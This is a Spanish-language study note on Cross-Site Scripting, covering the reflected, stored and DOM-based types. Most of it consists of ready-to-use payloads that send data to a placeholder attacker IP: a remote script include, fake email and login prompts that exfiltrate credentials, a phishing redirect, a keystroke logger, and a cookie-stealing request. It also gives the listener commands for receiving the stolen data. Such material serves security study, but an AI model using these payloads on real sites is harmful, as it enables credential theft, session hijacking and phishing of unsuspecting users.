---------
- Tags: #OWASP_TOP_10 #vulnerabilidad #hacking #XSS
--------------
# Definición

> Es un tipo de [[Vulnerabilidades web]] que permite a un atacante inyectar en la página código **JavaScript** o un lenguaje similar. Estos scripts pueden ser ejecutados en el navegador de la víctima, permitiendo al atacante robar información, tomar control de cuentas o realizar actividades perjudiciales en el contexto del usuario afectado.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

# Detección de vulnerabilidad

Para detectar si una página web es vulnerable a **XSS**, necesitamos ver en algún lado de la página web algo que hayamos publicado, por ejemplo, si es una página web con la posibilidad de subida de posts, dichos post quedarán mostrados en la página. 

Si ocurre lo mencionado, podemos hacer uso de **etiquetas html** (h1,h2,marquee...), para comprobar si es vulnerable a **HTML Injection**, y si es así, podríamos intentar un pequeño script escrito en **JavaScript** para terminar de confirmar la vulnerabilidad, por ejemplo:

```JavaScript
<script> alert("ALERTA"); </script>
```

de manera que si la página web es vulnerable, saltará una ventana emergente mostrando "**ALERTA**".


Todos los scripts que vamos a utilizar de ahora en adelante, no tienen porque estar localmente en la máquina víctima, sino que podemos hacer uso del siguiente comando para ejecutar un script de manera remota (no haría falta que el script incluya las etiquetas de script):

```JavaScript
<script src="http://<IP_ATACANTE>/test.js"></script>
```

# XXS + ingeniería social

Si una página es vulnerable a **XSS**, podemos emplear uso de **ingeniería social** para recopilar información que envíen los usuarios que caigan en nuestra trampa. Podemos hacer uso del siguiente script, que **solicita al usuario su correo** para poder acceder en este caso a un post:

```JavaScript
<script>
	var email = prompt("Por favor, introduce tu correo para visualizar este post", "example@example.com");
	
	if (email == null || email == ""){
		alert("Es necesario introducir un correo válido para poder visualizar el post");
	}
	else{
		fetch("http://<IP_ATACANTE>/?email=" + email);
	}
</script>

```

Pero claro, ya que estamos, podemos solicitar además del **correo**, la **contraseña** del usuario, de manera que si introduce los datos solicitados, tendríamos acceso a su cuenta:

```JavaScript
<div id="formContainer"></div>

<script>
 var email;
 var password;
 var form = '<form>' +
  'Email: <input type="email" id="email" required>' +
  ' Contraseña: <input type="password" id="password" required>' +
  '<input type="button" onclick="submitForm()" value="Submit">' +
  '</form>';

 document.getElementById("formContainer").innerHTML = form;
 
 function submitForm() {
  email = document.getElementById("email").value;
  password = document.getElementById("password").value;
  fetch("http:/<IP_ATACANTE>/?email=" + email + "&password=" + password);
 }
</script>

```

En ambos casos, debemos abrir previamente un servidor http para que nos lleguen los mensajes enviados:

```bash
python3 -m http.server 80 
```


A parte de esto, podemos realizar un **redirigimiento** para que el infectado visite otra página web, que podíamos tener previamente preparada para realizar un ataque de [[Phishing]], o a cualquier otro sitio de interés:

```JavaScript
window.location.href = "<URL>";
```


Aún así, este tipos de ataques depende de nuestra capacidad con [[Ingeniería social]], y la incredulidad del usuario que visite nuestra parte de la web infectada.

# XSS Keylogger

Un keylogger, es una especie de malware que envía al atacante las teclas que ha pulsado el infectado. Para ello podemos hacer uso del siguiente script en **JavaScript** suponiendo que es vulnerable a **XSS**:

```JavaScript
<script>
	var k = "";
	document.onkeypress = function(e){
		e = e || window.event;
		k += e.key;
		var i = new Image();
		i.src = "http://<IP_ATACANTE>/" + k;
	};
</script>
```

También es necesario tener un servidor abierto, y además podemos filtrar para que solo nos muestre la información que queramos de la siguiene manera:

```bash
python3 -m http.server 80 | grep -oP 'GET /\K[^.*\s]+'
```


# XSS [[Cookie Hijacking]]

Si no está habilitado el campo de **HTTPOnly** en la cookie de sesión de un usuario, podemos hacer uso del siguiente script para intentar capturar dicha cookie y enviarla al atacante:

```JavaScript
<script> 
var request = new XMLHttpRequest(); 
request.open('GET', 'http://<IP_ATACANTE>/?cookie=' + document.cookie); 
request.send(); 
</script>
```

Una vez obtenida la cookie, podemos **introducirnos en la sesión** de dicho usuario, y actuar como si fuéramos el mismo.

# Ejemplos prácticos

[Gossip World](https://github.com/globocom/secDevLabs) 
[Máquina de vulnhub](https://www.vulnhub.com/entry/myexpense-1,405/)